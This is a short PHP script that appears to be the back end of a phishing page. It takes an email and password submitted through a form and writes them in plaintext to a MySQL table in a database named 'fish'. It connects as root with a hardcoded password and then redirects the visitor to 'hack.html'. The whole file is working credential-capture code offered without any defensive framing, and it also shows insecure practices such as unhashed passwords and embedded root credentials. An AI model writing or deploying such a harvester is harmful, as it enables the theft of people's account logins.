<?php
$mail = $_POST["mail"] ?? "";
$user_password = $_POST["password"] ?? "";

$host = "localhost";
$dbname = "fish";
$username = "root";
$db_password = "2006";

// Connexion MySQL
$conn = mysqli_connect($host, $username, $db_password, $dbname);

if (!$conn) {
    die ("Connexion échouée : " . mysqli_connect_error());
}

echo "Connexion réussie.";

$sql = "INSERT INTO login (mail, password) VALUES (?, ?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("ss", $mail, $user_password);

if ($stmt->execute()) {
    echo "Données enregistrées.";
} else {
    echo "Erreur DB : " . $stmt->error;
}

header('Location: hack.html');
exit;
